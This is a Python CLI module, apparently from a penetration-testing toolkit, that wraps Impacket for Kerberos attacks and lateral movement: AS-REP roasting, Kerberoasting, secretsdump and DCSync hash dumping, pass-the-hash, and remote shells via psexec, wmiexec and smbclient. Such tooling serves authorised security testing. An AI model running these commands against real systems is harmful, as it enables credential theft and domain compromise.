"""Kerberos & lateral movement CLI commands (Impacket wrappers)."""

import typer

from capo.cli.helpers import ensure_target

kerberos_app = typer.Typer(help="Kerberos attacks & lateral movement (Impacket)")

# ── Common option factories ───────────────────────────────────────────────────

def _target_arg():
    return typer.Argument(None, help="Target IP (uses current if not set)")

def _user_opt(required=False):
    return typer.Option(... if required else "", "--user", "-u", help="Username")

def _pass_opt():
    return typer.Option("", "--password", "-p", help="Password")

def _hash_opt():
    return typer.Option("", "--hash", "-H", help="NTLM hash (NT or LM:NT for PTH)")

def _domain_opt():
    return typer.Option("", "--domain", "-d", help="Domain name (auto-detected from state if omitted)")

def _dry_run_opt():
    return typer.Option(False, "--dry-run", help="Print command without executing")


# ── Commands ─────────────────────────────────────────────────────────────────

@kerberos_app.command("asrep-roast")
def asrep_roast(
    target:   str | None = _target_arg(),
    domain:   str        = _domain_opt(),
    userfile: str        = typer.Option("", "--userfile", "-f", help="File with usernames to test"),
    username: str        = typer.Option("", "--user",     "-u", help="Single username to test"),
    dry_run:  bool       = _dry_run_opt(),
):
    """AS-REP roast — request TGTs for accounts without Kerberos pre-auth.

    No credentials required. Provide a userlist or single user.
    Falls back to users discovered in current state if neither is given.
    """
    ensure_target(target)
    from capo.modules.wrappers.impacket_wrapper import ImpacketWrapper
    w = ImpacketWrapper(dry_run=dry_run)
    w.asrep_roast(target, domain=domain, userfile=userfile, username=username)


@kerberos_app.command("kerberoast")
def kerberoast(
    target:   str | None = _target_arg(),
    domain:   str        = _domain_opt(),
    username: str        = _user_opt(required=True),
    password: str        = _pass_opt(),
    hash_:    str        = typer.Option("", "--hash", "-H", help="NTLM hash for PTH"),
    dry_run:  bool       = _dry_run_opt(),
):
    """Kerberoast — request TGS tickets for accounts with SPNs.

    Requires valid domain credentials (password or NTLM hash).
    """
    ensure_target(target)
    from capo.modules.wrappers.impacket_wrapper import ImpacketWrapper
    w = ImpacketWrapper(dry_run=dry_run)
    w.kerberoast(target, domain=domain, username=username, password=password, hashes=hash_)


@kerberos_app.command("secretsdump")
def secretsdump(
    target:   str | None = _target_arg(),
    username: str        = _user_opt(required=True),
    password: str        = _pass_opt(),
    hash_:    str        = typer.Option("", "--hash", "-H", help="NTLM hash for PTH"),
    domain:   str        = _domain_opt(),
    dry_run:  bool       = _dry_run_opt(),
):
    """Dump SAM/LSA/NTDS hashes remotely via secretsdump.

    Works against any Windows host. Use --hash for pass-the-hash.
    """
    ensure_target(target)
    from capo.modules.wrappers.impacket_wrapper import ImpacketWrapper
    w = ImpacketWrapper(dry_run=dry_run)
    w.secretsdump(target, username=username, password=password, hashes=hash_, domain=domain)


@kerberos_app.command("dcsync")
def dcsync(
    target:    str | None = _target_arg(),
    username:  str        = _user_opt(required=True),
    password:  str        = _pass_opt(),
    hash_:     str        = typer.Option("", "--hash", "-H", help="NTLM hash for PTH"),
    domain:    str        = _domain_opt(),
    dump_user: str        = typer.Option("", "--dump-user", help="Dump a single account (default: all)"),
    dry_run:   bool       = _dry_run_opt(),
):
    """DCSync — replicate NTDS hashes using domain replication rights.

    Requires DA or replication privileges. Target should be the DC IP.
    Use --dump-user to dump a single account (e.g. Administrator).
    """
    ensure_target(target)
    from capo.modules.wrappers.impacket_wrapper import ImpacketWrapper
    w = ImpacketWrapper(dry_run=dry_run)
    w.dcsync(target, username=username, password=password, hashes=hash_,
             domain=domain, dump_user=dump_user)


@kerberos_app.command("psexec")
def psexec(
    target:   str | None = _target_arg(),
    username: str        = _user_opt(required=True),
    password: str        = _pass_opt(),
    hash_:    str        = typer.Option("", "--hash", "-H", help="NTLM hash for PTH"),
    domain:   str        = _domain_opt(),
):
    """Launch a SYSTEM shell via psexec.py (SMB).

    Supports pass-the-hash with --hash. This opens an interactive shell.
    """
    ensure_target(None)
    from capo.modules.wrappers.impacket_wrapper import ImpacketWrapper
    w = ImpacketWrapper()
    w.exec_shell("psexec", username=username, password=password, hashes=hash_, domain=domain)


@kerberos_app.command("wmiexec")
def wmiexec(
    target:   str | None = _target_arg(),
    username: str        = _user_opt(required=True),
    password: str        = _pass_opt(),
    hash_:    str        = typer.Option("", "--hash", "-H", help="NTLM hash for PTH"),
    domain:   str        = _domain_opt(),
):
    """Launch a semi-interactive shell via wmiexec.py (WMI — stealthier than psexec).

    Supports pass-the-hash with --hash. This opens an interactive shell.
    """
    ensure_target(None)
    from capo.modules.wrappers.impacket_wrapper import ImpacketWrapper
    w = ImpacketWrapper()
    w.exec_shell("wmiexec", username=username, password=password, hashes=hash_, domain=domain)


@kerberos_app.command("smbclient")
def smbclient(
    target:   str | None = _target_arg(),
    username: str        = typer.Option("", "--user", "-u", help="Username (blank for null session)"),
    password: str        = _pass_opt(),
    hash_:    str        = typer.Option("", "--hash", "-H", help="NTLM hash for PTH"),
    domain:   str        = _domain_opt(),
):
    """Open an interactive SMB shell via smbclient.py.

    Leave --user blank for a null session attempt.
    """
    ensure_target(None)
    from capo.modules.wrappers.impacket_wrapper import ImpacketWrapper
    w = ImpacketWrapper()
    w.exec_shell("smbclient", username=username, password=password, hashes=hash_, domain=domain)
